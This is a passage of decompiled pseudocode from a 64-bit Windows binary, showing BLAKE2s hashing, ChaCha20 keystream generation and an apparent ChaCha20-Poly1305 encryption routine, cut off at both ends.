        v10 = v9 + 1;
        if ( *v7 == *v6 )
          v10 = v9;
        ++v7;
        ++v6;
        v9 = v10;
      }
      while ( *v7 != 61 );
      if ( v9 == 0 && *v7 == 61 )
      {
LABEL_12:
        if ( *v6 == 0 )
          return v7 + 1;
      }
    }
    if ( (int)++v3 >= a1 )
      return nullptr;
  }
}


// ----- sub_14000C440 @ 0x14000c440 -----
void __fastcall sub_14000C440(__int64 a1, _OWORD *a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  unsigned __int64 v4; // r14
  _OWORD *v5; // rsi
  const __m128i *v6; // r13
  __int64 v7; // rbx
  __int64 v8; // rdi
  __m128i v9; // xmm3
  __int128 v10; // xmm1
  __int128 v11; // xmm0
  unsigned int v12; // ecx
  int v13; // edx
  int v14; // r8d
  __m128 v15; // xmm2
  unsigned int v16; // r12d
  __int128 v17; // xmm1
  __int128 v18; // xmm0
  __m128 v19; // xmm1
  __int64 v20; // rax
  unsigned int v21; // ecx
  char *v22; // r13
  char *v23; // r12
  signed int v24; // r10d
  int v25; // eax
  unsigned int v26; // r9d
  int v27; // r8d
  int v28; // edx
  __int32 v29; // edx
  __int64 v30; // r15
  int *v31; // rsi
  __int32 *v32; // rdi
  __int32 *v33; // r10
  int v34; // ebx
  int v35; // r9d
  int v36; // r8d
  int v37; // r11d
  __int32 v38; // ebx
  __int32 v39; // r9d
  int v40; // eax
  unsigned int v41; // r9d
  int v42; // r8d
  signed int v43; // r10d
  int v44; // edx
  int v45; // edx
  int *v46; // rsi
  _DWORD *v47; // rdi
  _DWORD *v48; // r10
  int v49; // ebx
  int v50; // r9d
  int v51; // r8d
  int v52; // r11d
  int v53; // ebx
  int v54; // r9d
  __m128 v55; // xmm1
  _QWORD v56[3]; // [rsp+20h] [rbp-91h] BYREF
  __m128 v57; // [rsp+38h] [rbp-79h]
  __m128i v58; // [rsp+48h] [rbp-69h] BYREF
  __m128 v59; // [rsp+58h] [rbp-59h] BYREF
  char *v60; // [rsp+68h] [rbp-49h]
  char *v61; // [rsp+70h] [rbp-41h]
  char *v62; // [rsp+78h] [rbp-39h]
  _QWORD v63[8]; // [rsp+88h] [rbp-29h]
  _OWORD *v65; // [rsp+120h] [rbp+6Fh]
  unsigned __int64 v66; // [rsp+128h] [rbp+77h]
  unsigned int v67; // [rsp+130h] [rbp+7Fh]

  if ( a3 != 0 )
  {
    v3 = *(_QWORD *)(a1 + 112);
    v4 = a3;
    v5 = a2;
    v6 = (const __m128i *)a1;
    v7 = 64 - v3;
    if ( a3 > 64 - v3 )
    {
      v8 = a1 + 48;
      *(_QWORD *)(a1 + 112) = 0;
      sub_140022A10(a1 + 48 + v3, a2, 64 - v3);
      v6[2].m128i_i32[0] += 64;
      if ( v6[2].m128i_i32[0] < 0x40u )
        ++v6[2].m128i_i32[1];
      sub_14000C9D0(v6, v8);
      v5 = (_OWORD *)((char *)v5 + v7);
      v4 -= v7;
      v65 = v5;
      v66 = v4;
      if ( v4 > 0x40 )
      {
        v9 = _mm_loadu_si128((const __m128i *)&xmmword_140001A20);
        do
        {
          v6[2].m128i_i32[0] += 64;
          if ( v6[2].m128i_i32[0] < 0x40u )
            ++v6[2].m128i_i32[1];
          v10 = v5[1];
          v11 = *v5;
          v12 = v6[2].m128i_i32[1] ^ 0x9B05688C;
          v13 = v6[2].m128i_i32[2] ^ 0x1F83D9AB;
          v14 = v6[2].m128i_i32[3] ^ 0x5BE0CD19;
          v15 = (__m128)_mm_loadu_si128(v6);
          v16 = 0;
          v59.m128_i32[0] = v6[2].m128i_i32[0] ^ 0x510E527F;
          *(_OWORD *)&v63[2] = v10;
          v17 = v5[3];
          *(unsigned __int64 *)((char *)v59.m128_u64 + 4) = __PAIR64__(v13, v12);
          *(_OWORD *)v63 = v11;
          v18 = v5[2];
          *(_OWORD *)&v63[6] = v17;
          v19 = (__m128)_mm_loadu_si128(v6 + 1);
          v59.m128_i32[3] = v14;
          *(_OWORD *)&v63[4] = v18;
          v57 = v19;
          v58 = v9;
          *(__m128 *)&v56[1] = v15;
          v67 = 0;
          do
          {
            v20 = 16LL * v16;
            v21 = 0;
            v60 = &byte_140001A41[v20];
            v22 = &byte_140001A40[v20];
            v23 = &byte_140001A41[v20];
            v61 = &byte_140001A42[v20];
            v62 = &byte_140001A43[v20];
            do
            {
              if ( v21 >= 4 )
              {
                v24 = v21 - 4;
                v28 = (int)(v21 - 4) / 3;
                v25 = (int)(v21 + v28 - 3) % 4;
                v26 = (v21 - 2) & 0x80000003;
                v27 = (int)(v21 - 1 - v28) % 4;
              }
              else
              {
                v24 = v21;
                v25 = v21;
                v26 = v21;
                v27 = v21;
              }
              v29 = v57.m128_i32[v25];
              v30 = (int)(2 * v21);
              v31 = (int *)&v56[1] + v24;
              v32 = &v59.m128_i32[v27];
              v33 = &v58.m128i_i32[v26];
              v34 = __ROR4__(*v32 ^ (v29 + *v31 + *((_DWORD *)v63 + (unsigned __int8)v22[v30])), 16);
              v35 = v34 + *v33;
              v36 = __ROR4__(v29 ^ v35, 12);
              v37 = v36
                  + *((_DWORD *)v63 + (unsigned __int8)v23[v30])
                  + v29
                  + *v31
                  + *((_DWORD *)v63 + (unsigned __int8)v22[v30]);
              *v31 = v37;
              v38 = __ROR4__(v37 ^ v34, 8);
              v39 = v38 + v35;
              v57.m128_i32[v25] = __ROR4__(v36 ^ v39, 7);
              *v33 = v39;
              *v32 = v38;
              if ( v21 >= 3 )
              {
                v43 = v21 - 3;
                v44 = (int)(v21 - 3) / 3;
                v40 = (int)(v21 + v44 - 2) % 4 + 4;
                v41 = ((v21 - 1) & 0x80000003) + 8;
                v42 = (int)(v21 - v44) % 4 + 12;
              }
              else
              {
                v40 = v21 + 5;
                v41 = v21 + 9;
                v42 = v21 + 13;
                v43 = v21 + 1;
              }
              v45 = *((_DWORD *)&v56[1] + v40);
              v46 = (int *)&v56[1] + v43;
              v21 += 2;
              v47 = (_DWORD *)&v56[1] + v42;
              v48 = (_DWORD *)&v56[1] + (int)v41;
              v49 = __ROR4__(*v47 ^ (v45 + *v46 + *((_DWORD *)v63 + (unsigned __int8)v61[v30])), 16);
              v50 = v49 + *v48;
              v51 = __ROR4__(v45 ^ v50, 12);
              v52 = v51
                  + *((_DWORD *)v63 + (unsigned __int8)v62[v30])
                  + v45
                  + *v46
                  + *((_DWORD *)v63 + (unsigned __int8)v61[v30]);
              *v46 = v52;
              v53 = __ROR4__(v52 ^ v49, 8);
              v54 = v53 + v50;
              *((_DWORD *)&v56[1] + v40) = __ROR4__(v51 ^ v54, 7);
              *v48 = v54;
              *v47 = v53;
            }
            while ( v21 < 8 );
            v16 = v67 + 1;
            v67 = v16;
          }
          while ( v16 < 0xA );
          v6 = (const __m128i *)a1;
          v5 = v65 + 4;
          v55 = _mm_xor_ps(_mm_xor_ps(v19, v59), v57);
          v65 += 4;
          v66 -= 64LL;
          v4 = v66;
          *(__m128 *)a1 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_loadu_si128(&v58), v15), *(__m128 *)&v56[1]);
          *(__m128 *)(a1 + 16) = v55;
        }
        while ( v66 > 0x40 );
      }
    }
    sub_140022A10(&v6[3].m128i_i8[v6[7].m128i_i64[0]], v5, v4);
    v6[7].m128i_i64[0] += v4;
  }
}


// ----- sub_14000C870 @ 0x14000c870 -----
__int64 __fastcall sub_14000C870(__int64 a1, _OWORD *a2)
{
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rcx
  __int64 result; // rax

  *(_DWORD *)(a1 + 32) += *(_DWORD *)(a1 + 112);
  v4 = *(unsigned int *)(a1 + 32);
  v5 = *(_QWORD *)(a1 + 112);
  if ( v4 < v5 )
    ++*(_DWORD *)(a1 + 36);
  *(_DWORD *)(a1 + 40) = -1;
  sub_1400230C0(a1 + v5 + 48, 0, 64 - v5);
  result = sub_14000C9D0(a1, a1 + 48);
  *a2 = *(_OWORD *)a1;
  a2[1] = *(_OWORD *)(a1 + 16);
  return result;
}


// ----- sub_14000C8E0 @ 0x14000c8e0 -----
__int64 __fastcall sub_14000C8E0(_OWORD *a1, unsigned __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax
  __int128 v6; // xmm0
  unsigned int v7; // [rsp+20h] [rbp-29h] BYREF
  _DWORD v8[7]; // [rsp+24h] [rbp-25h]
  __int128 v9; // [rsp+40h] [rbp-9h]
  _QWORD v10[8]; // [rsp+50h] [rbp+7h] BYREF
  unsigned __int64 v11; // [rsp+90h] [rbp+47h]

  v11 = 0;
  v9 = 0;
  memset(v10, 0, 32);
  if ( (unsigned __int64)(a4 - 1) > 0x1F )
    LODWORD(a4) = 32;
  memset(&v10[4], 0, 32);
  v7 = a4 ^ 0x6B08E667;
  qmemcpy(v8, byte_140001A24, sizeof(v8));
  sub_14000C440((__int64)&v7, a1, a2);
  LODWORD(v9) = v11 + v9;
  if ( (unsigned int)v9 < v11 )
    ++DWORD1(v9);
  DWORD2(v9) = -1;
  sub_1400230C0((char *)v10 + v11, 0, 64 - v11);
  sub_14000C9D0(&v7, v10);
  result = v7;
  v6 = *(_OWORD *)&v8[3];
  *(_OWORD *)(a3 + 4) = *(_OWORD *)v8;
  *(_DWORD *)a3 = result;
  *(_OWORD *)(a3 + 16) = v6;
  return result;
}


// ----- sub_14000C9D0 @ 0x14000c9d0 -----
__m128i *__fastcall sub_14000C9D0(__m128i *a1, __int128 *a2)
{
  __int128 v2; // xmm0
  __int128 v4; // xmm1
  unsigned int v5; // ecx
  int v6; // r8d
  __m128 v7; // xmm2
  __int128 v8; // xmm0
  __int128 v9; // xmm1
  int v10; // edx
  unsigned int v11; // r12d
  __m128 v12; // xmm1
  __int64 v13; // rax
  unsigned int v14; // ecx
  char *v15; // r13
  char *v16; // r12
  unsigned int v17; // r10d
  int v18; // eax
  unsigned int v19; // r9d
  int v20; // r8d
  int v21; // edx
  __int32 v22; // edx
  __int64 v23; // r15
  int *v24; // rsi
  __int32 *v25; // rdi
  __int32 *v26; // r10
  int v27; // ebx
  int v28; // r9d
  int v29; // r8d
  int v30; // r11d
  __int32 v31; // ebx
  __int32 v32; // r9d
  int v33; // eax
  unsigned int v34; // r9d
  int v35; // r8d
  unsigned int v36; // r10d
  int v37; // edx
  __int32 v38; // edx
  __int32 *v39; // rsi
  __int32 v40; // r11d
  __int32 *v41; // rdi
  __int32 *v42; // r10
  int v43; // ebx
  int v44; // r9d
  int v45; // r8d
  __int32 v46; // r11d
  __int32 v47; // ebx
  __int32 v48; // r9d
  __m128 v50; // xmm1
  __m128 v51; // [rsp+0h] [rbp-69h] BYREF
  __m128 v52; // [rsp+10h] [rbp-59h]
  __m128i v53; // [rsp+20h] [rbp-49h] BYREF
  __m128 v54; // [rsp+30h] [rbp-39h] BYREF
  char *v55; // [rsp+40h] [rbp-29h]
  char *v56; // [rsp+48h] [rbp-21h]
  _QWORD v57[14]; // [rsp+50h] [rbp-19h]
  unsigned int v59; // [rsp+E0h] [rbp+77h]

  v2 = *a2;
  v4 = a2[1];
  v5 = a1[2].m128i_i32[1] ^ 0x9B05688C;
  v6 = a1[2].m128i_i32[3] ^ 0x5BE0CD19;
  v7 = (__m128)_mm_loadu_si128(a1);
  v54.m128_i32[0] = a1[2].m128i_i32[0] ^ 0x510E527F;
  *(_OWORD *)v57 = v2;
  v8 = a2[2];
  v54.m128_i32[1] = v5;
  *(_OWORD *)&v57[2] = v4;
  v9 = a2[3];
  v10 = a1[2].m128i_i32[2] ^ 0x1F83D9AB;
  *(_OWORD *)&v57[4] = v8;
  v11 = 0;
  v54.m128_u64[1] = __PAIR64__(v6, v10);
  *(_OWORD *)&v57[6] = v9;
  v12 = (__m128)_mm_loadu_si128(a1 + 1);
  v53 = _mm_loadu_si128((const __m128i *)&unk_140001A20);
  v52 = v12;
  v51 = v7;
  v59 = 0;
  do
  {
    v13 = 16LL * v11;
    v14 = 0;
    v15 = &byte_140001A40[v13];
    v16 = &byte_140001A41[v13];
    v55 = &byte_140001A42[v13];
    v56 = &byte_140001A43[v13];
    do
    {
      if ( v14 >= 4 )
      {
        v17 = v14 - 4;
        v21 = (int)(v14 - 4) / 3;
        v18 = (int)(v14 + v21 - 3) % 4;
        v19 = (v14 - 2) & 0x80000003;
        v20 = (int)(v14 - 1 - v21) % 4;
      }
      else
      {
        v17 = v14;
        v18 = v14;
        v19 = v14;
        v20 = v14;
      }
      v22 = v52.m128_i32[v18];
      v23 = (int)(2 * v14);
      v24 = &v51.m128_i32[v17];
      v25 = &v54.m128_i32[v20];
      v26 = &v53.m128i_i32[v19];
      v27 = __ROR4__(*v25 ^ (v22 + *v24 + *((_DWORD *)v57 + (unsigned __int8)v15[v23])), 16);
      v28 = v27 + *v26;
      v29 = __ROR4__(v22 ^ v28, 12);
      v30 = v29
          + *((_DWORD *)v57 + (unsigned __int8)v16[v23])
          + v22
          + *v24
          + *((_DWORD *)v57 + (unsigned __int8)v15[v23]);
      *v24 = v30;
      v31 = __ROR4__(v30 ^ v27, 8);
      v32 = v31 + v28;
      v52.m128_i32[v18] = __ROR4__(v29 ^ v32, 7);
      *v26 = v32;
      *v25 = v31;
      if ( v14 >= 3 )
      {
        v36 = v14 - 3;
        v37 = (int)(v14 - 3) / 3;
        v33 = (int)(v14 + v37 - 2) % 4 + 4;
        v34 = ((v14 - 1) & 0x80000003) + 8;
        v35 = (int)(v14 - v37) % 4 + 12;
      }
      else
      {
        v33 = v14 + 5;
        v34 = v14 + 9;
        v35 = v14 + 13;
        v36 = v14 + 1;
      }
      v38 = v51.m128_i32[v33];
      v39 = &v51.m128_i32[v36];
      v14 += 2;
      v40 = v38 + *v39 + *((_DWORD *)v57 + (unsigned __int8)v55[v23]);
      v41 = &v51.m128_i32[v35];
      v42 = &v51.m128_i32[v34];
      v43 = __ROR4__(*v41 ^ v40, 16);
      v44 = v43 + *v42;
      v45 = __ROR4__(v38 ^ v44, 12);
      v46 = v45 + *((_DWORD *)v57 + (unsigned __int8)v56[v23]) + v40;
      *v39 = v46;
      v47 = __ROR4__(v46 ^ v43, 8);
      v48 = v47 + v44;
      v51.m128_i32[v33] = __ROR4__(v45 ^ v48, 7);
      *v42 = v48;
      *v41 = v47;
    }
    while ( v14 < 8 );
    v11 = v59 + 1;
    v59 = v11;
  }
  while ( v11 < 0xA );
  v50 = _mm_xor_ps(_mm_xor_ps(v12, v54), v52);
  *(__m128 *)a1 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_loadu_si128(&v53), v7), v51);
  a1[1] = (__m128i)v50;
  return a1;
}


// ----- sub_14000CD00 @ 0x14000cd00 -----
__int64 __fastcall sub_14000CD00(__int64 a1, _OWORD *a2, __int64 a3, int a4)
{
  __int128 v4; // xmm1
  __int64 result; // rax

  qmemcpy((void *)a1, "expand 32-byte k", 16);
  *(_OWORD *)(a1 + 16) = *a2;
  v4 = a2[1];
  *(_DWORD *)(a1 + 48) = a4;
  *(_OWORD *)(a1 + 32) = v4;
  *(_QWORD *)(a1 + 52) = *(_QWORD *)a3;
  result = *(unsigned int *)(a3 + 8);
  *(_DWORD *)(a1 + 60) = result;
  *(_QWORD *)(a1 + 128) = 64;
  return result;
}


// ----- sub_14000CD60 @ 0x14000cd60 -----
unsigned __int64 __fastcall sub_14000CD60(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  __int64 v4; // r8
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rax
  __int128 v7; // xmm1
  __int128 v8; // xmm0
  int v9; // r14d
  int v10; // r8d
  int v11; // esi
  int v12; // ebx
  int v13; // r9d
  int v14; // r11d
  int v15; // r10d
  int v16; // edi
  int v17; // r12d
  int v18; // r15d
  int v19; // edi
  int v20; // edx
  int v21; // ebx
  int v22; // r10d
  int v23; // r15d
  int v24; // r13d
  int v25; // edx
  int v26; // edi
  int v27; // r11d
  int v28; // r12d
  int v29; // r10d
  int v30; // edx
  int v31; // esi
  int v32; // r9d
  int v33; // r8d
  int v34; // r11d
  int v35; // edx
  int v36; // r14d
  int v37; // r9d
  int v38; // eax
  int v39; // ebx
  int v40; // edx
  int v41; // ecx
  int v42; // edx
  int v43; // r8d
  int v44; // eax
  int v45; // ecx
  int v46; // edx
  int v47; // r8d
  int v48; // r10d
  int v49; // eax
  int v50; // ecx
  int v51; // r8d
  int v52; // ebx
  __int64 v53; // rax
  __int128 v54; // xmm1
  __int128 v55; // xmm0
  __int128 v56; // xmm1
  int v58; // [rsp+8h] [rbp-59h]
  int v59; // [rsp+Ch] [rbp-55h]
  int v60; // [rsp+10h] [rbp-51h]
  _QWORD v61[2]; // [rsp+18h] [rbp-49h] BYREF
  __int128 v62; // [rsp+28h] [rbp-39h]
  __int128 v63; // [rsp+38h] [rbp-29h]
  __int128 v64; // [rsp+48h] [rbp-19h]
  int v65; // [rsp+58h] [rbp-9h]
  int v66; // [rsp+5Ch] [rbp-5h]
  int v67; // [rsp+60h] [rbp-1h]
  unsigned __int64 v68; // [rsp+68h] [rbp+7h]
  __int64 v69; // [rsp+C8h] [rbp+67h]
  int v72; // [rsp+E0h] [rbp+7Fh]

  v69 = a1;
  result = a3;
  v4 = a2;
  v5 = 0;
  v68 = 0;
  if ( result != 0 )
  {
    do
    {
      v6 = *(_QWORD *)(a1 + 128);
      if ( v6 >= 0x40 )
      {
        v60 = 10;
        v7 = *(_OWORD *)(a1 + 16);
        *(_OWORD *)v61 = *(_OWORD *)a1;
        v8 = *(_OWORD *)(a1 + 32);
        v62 = v7;
        v9 = HIDWORD(v7);
        v10 = DWORD2(v7);
        v11 = DWORD1(v7);
        v12 = v7;
        v64 = *(_OWORD *)(a1 + 48);
        v13 = HIDWORD(v64);
        v14 = DWORD2(v64);
        v15 = DWORD1(v64);
        v16 = v64;
        v63 = v8;
        v17 = DWORD1(v8);
        v18 = v8;
        do
        {
          v19 = __ROR4__((v12 + LODWORD(v61[0])) ^ v16, 16);
          v20 = __ROR4__(v12 ^ (v18 + v19), 20);
          v21 = v20 + v12 + LODWORD(v61[0]);
          v22 = __ROR4__((v11 + HIDWORD(v61[0])) ^ v15, 16);
          v59 = __ROR4__(v21 ^ v19, 24);
          v23 = v18 + v19 + v59;
          v24 = __ROR4__(v20 ^ v23, 25);
          v25 = __ROR4__(v11 ^ (v17 + v22), 20);
          v26 = v25 + v11 + HIDWORD(v61[0]);
          v27 = __ROR4__((v10 + LODWORD(v61[1])) ^ v14, 16);
          v65 = __ROR4__(v26 ^ v22, 24);
          v28 = v17 + v22 + v65;
          v29 = __ROR4__(v25 ^ v28, 25);
          v30 = __ROR4__(v10 ^ (v27 + DWORD2(v63)), 20);
          v31 = v30 + v10 + LODWORD(v61[1]);
          v32 = __ROR4__((v9 + HIDWORD(v61[1])) ^ v13, 16);
          v66 = __ROR4__(v31 ^ v27, 24);
          v33 = v27 + DWORD2(v63) + v66;
          v34 = __ROR4__(v30 ^ v33, 25);
          v35 = __ROR4__(v9 ^ (v32 + HIDWORD(v63)), 20);
          v36 = v35 + v9 + HIDWORD(v61[1]);
          v72 = __ROR4__(v36 ^ v32, 24);
          v37 = v32 + HIDWORD(v63) + v72;
          v58 = __ROR4__(v35 ^ v37, 25);
          v38 = v29 + v21;
          v39 = __ROR4__((v29 + v21) ^ v72, 16);
          v40 = __ROR4__(v29 ^ (v39 + v33), 20);
          LODWORD(v61[0]) = v40 + v38;
          HIDWORD(v64) = __ROR4__((v40 + v38) ^ v39, 24);
          DWORD2(v63) = HIDWORD(v64) + v39 + v33;
          v67 = __ROR4__(v40 ^ DWORD2(v63), 25);
          DWORD1(v62) = v67;
          v41 = __ROR4__(v59 ^ (v34 + v26), 16);
          v42 = v37 + v41;
          v13 = HIDWORD(v64);
          v43 = __ROR4__(v34 ^ v42, 20);
          HIDWORD(v61[0]) = v43 + v34 + v26;
          v16 = __ROR4__(v41 ^ HIDWORD(v61[0]), 24);
          LODWORD(v64) = v16;
          HIDWORD(v63) = v42 + v16;
          DWORD2(v62) = __ROR4__(v43 ^ (v42 + v16), 25);
          v44 = v58 + v31;
          v11 = v67;
          v45 = __ROR4__(v65 ^ v44, 16);
          v46 = v45 + v23;
          v47 = __ROR4__((v45 + v23) ^ v58, 20);
          v48 = v47 + v44;
          v49 = v36 + v24;
          LODWORD(v61[1]) = v48;
          v15 = __ROR4__(v45 ^ v48, 24);
          v50 = __ROR4__(v66 ^ (v36 + v24), 16);
          DWORD1(v64) = v15;
          v18 = v15 + v46;
          v9 = __ROR4__((v15 + v46) ^ v47, 25);
          HIDWORD(v62) = v9;
          v51 = __ROR4__(v24 ^ (v50 + v28), 20);
          HIDWORD(v61[1]) = v49 + v51;
          v14 = __ROR4__(v50 ^ (v49 + v51), 24);
          DWORD2(v64) = v14;
          v17 = v14 + v50 + v28;
          v52 = v51 ^ v17;
          v10 = DWORD2(v62);
          v12 = __ROR4__(v52, 25);
          --v60;
        }
        while ( v60 != 0 );
        a1 = v69;
        v53 = 0;
        LODWORD(v62) = v12;
        DWORD1(v63) = v17;
        LODWORD(v63) = v15 + v46;
        do
        {
          *(__m128i *)&v61[v53] = _mm_add_epi32(
                                    _mm_loadu_si128((const __m128i *)(v69 + 2 * v53)),
                                    _mm_loadu_si128((const __m128i *)&v61[v53]));
          v53 += 2;
        }
        while ( v53 != 8 );
        v54 = v62;
        *(_OWORD *)(v69 + 64) = *(_OWORD *)v61;
        v55 = v63;
        *(_OWORD *)(v69 + 80) = v54;
        v56 = v64;
        *(_OWORD *)(v69 + 96) = v55;
        *(_OWORD *)(v69 + 112) = v56;
        if ( (*(_DWORD *)(v69 + 48))++ == -1 )
          ++*(_DWORD *)(v69 + 52);
        v5 = v68;
        v6 = 0;
        v4 = a2;
        *(_QWORD *)(v69 + 128) = 0;
      }
      result = *(unsigned __int8 *)(v6 + a1 + 64);
      *(_BYTE *)(v5 + v4) ^= result;
      ++v5;
      ++*(_QWORD *)(a1 + 128);
      v68 = v5;
    }
    while ( v5 < a3 );
  }
  return result;
}


// ----- sub_14000D0D0 @ 0x14000d0d0 -----
_OWORD *__fastcall sub_14000D0D0(__int64 a1, _OWORD *a2)
{
  __int128 v2; // xmm1
  __int128 v3; // xmm0
  int v4; // r14d
  int v5; // r8d
  int v6; // esi
  int v7; // ebx
  int v8; // r9d
  int v9; // r11d
  int v10; // r10d
  int v11; // edi
  int v12; // r12d
  int v13; // r15d
  int v14; // edi
  int v15; // edx
  int v16; // ebx
  int v17; // r10d
  int v18; // r15d
  int v19; // r13d
  int v20; // edx
  int v21; // edi
  int v22; // r11d
  int v23; // r12d
  int v24; // r10d
  int v25; // edx
  int v26; // esi
  int v27; // r9d
  int v28; // r8d
  int v29; // r11d
  int v30; // edx
  int v31; // r14d
  int v32; // r9d
  int v33; // eax
  int v34; // ebx
  int v35; // edx
  int v36; // ecx
  int v37; // edx
  int v38; // r8d
  int v39; // eax
  int v40; // ecx
  int v41; // edx
  int v42; // r8d
  int v43; // r10d
  int v44; // eax
  int v45; // ecx
  int v46; // r8d
  int v47; // ebx
  __int64 v48; // rax
  _OWORD *result; // rax
  __int128 v50; // xmm1
  __int128 v51; // xmm0
  __int128 v52; // xmm1
  int v54; // [rsp+0h] [rbp-68h]
  int v55; // [rsp+4h] [rbp-64h]
  _QWORD v56[2]; // [rsp+10h] [rbp-58h] BYREF
  __int128 v57; // [rsp+20h] [rbp-48h]
  __int128 v58; // [rsp+30h] [rbp-38h]
  __int128 v59; // [rsp+40h] [rbp-28h]
  int v60; // [rsp+50h] [rbp-18h]
  int v61; // [rsp+54h] [rbp-14h]
  int v62; // [rsp+58h] [rbp-10h]
  int v65; // [rsp+C0h] [rbp+58h]
  int v66; // [rsp+C8h] [rbp+60h]

  v55 = 10;
  v2 = *(_OWORD *)(a1 + 16);
  *(_OWORD *)v56 = *(_OWORD *)a1;
  v3 = *(_OWORD *)(a1 + 32);
  v57 = v2;
  v4 = HIDWORD(v2);
  v5 = DWORD2(v2);
  v6 = DWORD1(v2);
  v7 = v2;
  v59 = *(_OWORD *)(a1 + 48);
  v8 = HIDWORD(v59);
  v9 = DWORD2(v59);
  v10 = DWORD1(v59);
  v11 = v59;
  v58 = v3;
  v12 = DWORD1(v3);
  v13 = v3;
  do
  {
    v14 = __ROR4__((v7 + LODWORD(v56[0])) ^ v11, 16);
    v15 = __ROR4__(v7 ^ (v13 + v14), 20);
    v16 = v15 + v7 + LODWORD(v56[0]);
    v17 = __ROR4__((v6 + HIDWORD(v56[0])) ^ v10, 16);
    v54 = __ROR4__(v16 ^ v14, 24);
    v18 = v13 + v14 + v54;
    v19 = __ROR4__(v15 ^ v18, 25);
    v20 = __ROR4__(v6 ^ (v12 + v17), 20);
    v21 = v20 + v6 + HIDWORD(v56[0]);
    v22 = __ROR4__((v5 + LODWORD(v56[1])) ^ v9, 16);
    v60 = __ROR4__(v21 ^ v17, 24);
    v23 = v12 + v17 + v60;
    v24 = __ROR4__(v20 ^ v23, 25);
    v25 = __ROR4__(v5 ^ (v22 + DWORD2(v58)), 20);
    v26 = v25 + v5 + LODWORD(v56[1]);
    v27 = __ROR4__((v4 + HIDWORD(v56[1])) ^ v8, 16);
    v61 = __ROR4__(v26 ^ v22, 24);
    v28 = v22 + DWORD2(v58) + v61;
    v29 = __ROR4__(v25 ^ v28, 25);
    v30 = __ROR4__(v4 ^ (v27 + HIDWORD(v58)), 20);
    v31 = v30 + v4 + HIDWORD(v56[1]);
    v65 = __ROR4__(v31 ^ v27, 24);
    v32 = v27 + HIDWORD(v58) + v65;
    v66 = __ROR4__(v30 ^ v32, 25);
    v33 = v24 + v16;
    v34 = __ROR4__((v24 + v16) ^ v65, 16);
    v35 = __ROR4__(v24 ^ (v34 + v28), 20);
    LODWORD(v56[0]) = v35 + v33;
    HIDWORD(v59) = __ROR4__((v35 + v33) ^ v34, 24);
    DWORD2(v58) = HIDWORD(v59) + v34 + v28;
    v62 = __ROR4__(v35 ^ DWORD2(v58), 25);
    DWORD1(v57) = v62;
    v36 = __ROR4__(v54 ^ (v29 + v21), 16);
    v37 = v32 + v36;
    v8 = HIDWORD(v59);
    v38 = __ROR4__(v29 ^ v37, 20);
    HIDWORD(v56[0]) = v38 + v29 + v21;
    v11 = __ROR4__(v36 ^ HIDWORD(v56[0]), 24);
    LODWORD(v59) = v11;
    HIDWORD(v58) = v37 + v11;
    DWORD2(v57) = __ROR4__(v38 ^ (v37 + v11), 25);
    v39 = v66 + v26;
    v6 = v62;
    v40 = __ROR4__(v60 ^ v39, 16);
    v41 = v40 + v18;
    v42 = __ROR4__((v40 + v18) ^ v66, 20);
    v43 = v42 + v39;
    v44 = v31 + v19;
    LODWORD(v56[1]) = v43;
    v10 = __ROR4__(v40 ^ v43, 24);
    v45 = __ROR4__(v61 ^ (v31 + v19), 16);
    DWORD1(v59) = v10;
    v13 = v10 + v41;
    v4 = __ROR4__((v10 + v41) ^ v42, 25);
    HIDWORD(v57) = v4;
    v46 = __ROR4__(v19 ^ (v45 + v23), 20);
    HIDWORD(v56[1]) = v44 + v46;
    v9 = __ROR4__(v45 ^ (v44 + v46), 24);
    DWORD2(v59) = v9;
    v12 = v9 + v45 + v23;
    v47 = v46 ^ v12;
    v5 = DWORD2(v57);
    v7 = __ROR4__(v47, 25);
    --v55;
  }
  while ( v55 != 0 );
  v48 = 0;
  LODWORD(v57) = v7;
  DWORD1(v58) = v12;
  LODWORD(v58) = v10 + v41;
  do
  {
    *(__m128i *)&v56[v48] = _mm_add_epi32(
                              _mm_loadu_si128((const __m128i *)(a1 + 2 * v48)),
                              _mm_loadu_si128((const __m128i *)&v56[v48]));
    v48 += 2;
  }
  while ( v48 != 8 );
  result = a2;
  v50 = v57;
  *a2 = *(_OWORD *)v56;
  v51 = v58;
  a2[1] = v50;
  v52 = v59;
  a2[2] = v51;
  a2[3] = v52;
  if ( (*(_DWORD *)(a1 + 48))++ == -1 )
    ++*(_DWORD *)(a1 + 52);
  return result;
}


// ----- sub_14000D390 @ 0x14000d390 -----
__int64 __fastcall sub_14000D390(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        _OWORD *a8)
{
  __int128 v13; // [rsp+20h] [rbp-138h] BYREF
  _QWORD v14[4]; // [rsp+30h] [rbp-128h] BYREF
  _BYTE v15[80]; // [rsp+50h] [rbp-108h] BYREF
  _BYTE v16[184]; // [rsp+A0h] [rbp-B8h] BYREF

  memset(v14, 0, sizeof(v14));
  sub_14000CD00((__int64)v16, a8, a7, 0);
  sub_14000CD60((__int64)v16, (__int64)v14, 0x20u);
  sub_14000CD00((__int64)v16, a8, a7, 1);
  sub_140022A10(a1, a3, a4);
  sub_14000CD60((__int64)v16, a1, a4);
  sub_140017030(v15, v14);
  if ( a5 != 0 && a6 != 0 )
  {
    sub_1400170B0(v15, a5, a6);
    if ( (a6 & 0xF) != 0 )
    {
      v13 = 0;
      sub_1400170B0(v15, &v13, 16 - (a6 & 0xF));
    }
  }
  sub_1400170B0(v15, a1, a4);
  if ( (a4 & 0xF) != 0 )
  {
    v13 = 0;
    sub_1400170B0(v15, &v13, 16 - (a4 & 0xF));
  }
  *(_QWORD *)&v13 = a6;
  *((_QWORD *)&v13 + 1) = a4;
  sub_1400170B0(v15, &v13, 16);
  sub_140017400(v15, a2);
  return 0;
}


// ----- sub_14000D510 @ 0x14000d510 -----
__int64 __fastcall sub_14000D510(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        unsigned int *a6,
        __int64 a7,
        _OWORD *a8)
{
  __m128 v12; // xmm2
  __m128 v13; // xmm2
  __int128 v15; // [rsp+20h] [rbp-E0h] BYREF
  unsigned int v16[4]; // [rsp+30h] [rbp-D0h] BYREF
